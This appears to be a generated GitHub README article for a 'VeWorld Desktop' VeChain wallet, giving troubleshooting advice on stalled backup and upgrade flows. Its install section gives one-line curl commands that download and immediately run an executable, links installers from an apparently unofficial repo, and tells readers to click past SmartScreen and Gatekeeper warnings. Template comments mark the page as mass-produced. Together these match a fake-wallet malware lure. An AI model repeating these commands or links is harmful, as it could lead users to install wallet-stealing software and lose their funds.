![VeWorld Desktop](../assets/banner-article.png)

# Backup VeChain Thor Wallet: The Dead End in VeWorld Desktop

When a flow stalls, the phrase is the way past it

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

If a backup or upgrade screen in VeWorld Desktop stalls, the way past it is the recovery phrase rather than a retry loop. Where a build offers no working path to re-display the phrase, the copy you wrote at setup is the backup; if an upgrade will not finish, the current release installed fresh restores the same address.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

A progress indicator sits at the same point, a button does nothing, or the app returns to the previous screen without an error message. The pattern is worse when it happens during a flow the interface described as protective, because a failed backup feels like a failed safety net.

| Flow | What it was meant to do | What to do when it stalls |
|---|---|---|
| Backup screen, where a build has one | Re-display or confirm the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a> | Use the phrase you wrote down at setup |
| Upgrade | Move local data to a newer build | Install the current release and restore |
| Restore | Rebuild the account from a phrase | Retry once, then check the words |
| Export, where a build offers one | Produce an encrypted file | Never let the file be the only copy |

## Why it happens

A screen that re-displays a phrase has to render sensitive material, which builds typically gate behind an extra confirmation, a password re-entry or a deliberate delay. When a dependency like that is unavailable or behaves unexpectedly, the screen can stop without saying why.

Upgrade flows carry a different risk: they migrate local storage from an older shape to a newer one. If the migration cannot complete, the app can end up neither on the old data nor the new, which presents as a loop or a blank screen rather than a clear error.

Both cases share a property worth internalising. The phrase is independent of every one of these flows. It was generated at setup and it reconstructs the address from nothing, so a broken backup screen cannot take away a backup that was already written down. The failure only matters for someone who never wrote it. For anyone in that position the usual self-custody rule applies: the installation is replaceable, the phrase is not, and a stalled flow is a prompt to record the phrase from a working device rather than to press the same button again.

That is also why the advice is not to retry indefinitely. Each retry of a migration is another chance for the local store to be left half-moved, and a fresh installation plus a phrase restore reaches a clean state in one step. What a user loses in that move is local convenience - labels, contacts, history cached by the app - not the account.

## Fix

1. Write down what the stalled flow was doing, so the same failure is not repeated later.
2. If it was a backup, stop trying to make the app display the phrase and use the copy you wrote at setup.
3. If it was an upgrade, note the address, then install the current release from the project's GitHub releases page.
4. Restore from the phrase or keystore on the fresh installation and confirm the derived address.
5. Set a new local password, then check that balances and tokens appear before uninstalling anything else.
6. Report the stall with the release version you were running, so the cause can be fixed in a later build.

## If that did not work

If the restore does not reproduce the address, check the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md">zero-balance guide for VeWorld Desktop</a> before doubting the phrase. A custom path is the usual explanation for a restored account with no balance.

If the fresh installation stalls in the same place, the problem is environmental rather than in the flow: check free disk space, folder permissions and whether security software is blocking the app's data directory.

If neither backup nor phrase is available, treat the device as the last copy and do not uninstall. Continue using the existing installation for signatures while the phrase is recovered from wherever it was recorded, because uninstalling removes the only remaining route.

## Prevention

- Write the recovery phrase down at setup and verify it once, so no in-app backup flow is ever the only copy; never share it with anyone, including someone offering to help with a stalled update.
- Keep the installer for the current release, or note the release page, so a reinstall is quick.
- Update when you are not mid-transaction, and confirm access immediately afterwards.
- Report flowing stalls with the exact release version; a reproducible dead end is a fixable one.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### If the backup screen fails, am I unbacked up?

Only if you never wrote the phrase. The phrase generated at setup is the backup, and the screen is a convenience for viewing it again.

### Is it safe to reinstall over a stalled upgrade?

Install the current release deliberately rather than repeatedly, and restore from the phrase afterwards. Reinstalling without the phrase risks removing the last local copy.

### Why does the upgrade loop rather than show an error?

Because a storage migration that cannot finish leaves the app unsure which data set to open. A clear error is a design improvement, not a guarantee in every build.

### What do I lose by restoring instead of upgrading?

Local conveniences such as labels and cached history. The address, the balances and the tokens come back from the chain.

### Should I report a stalled flow?

Yes, with the release version and the step where it stopped. That is the information that turns a dead end into a fix.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [When an update blocks the unlock screen](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-password-pin-screen-veworld-desktop.md)
- [Recovering a wallet when the password is gone](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md)
- [How the password and the phrase differ](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [What to check when a restore shows nothing](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [Keeping a desktop install on the current release](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-windows-wallet-veworld-desktop.md)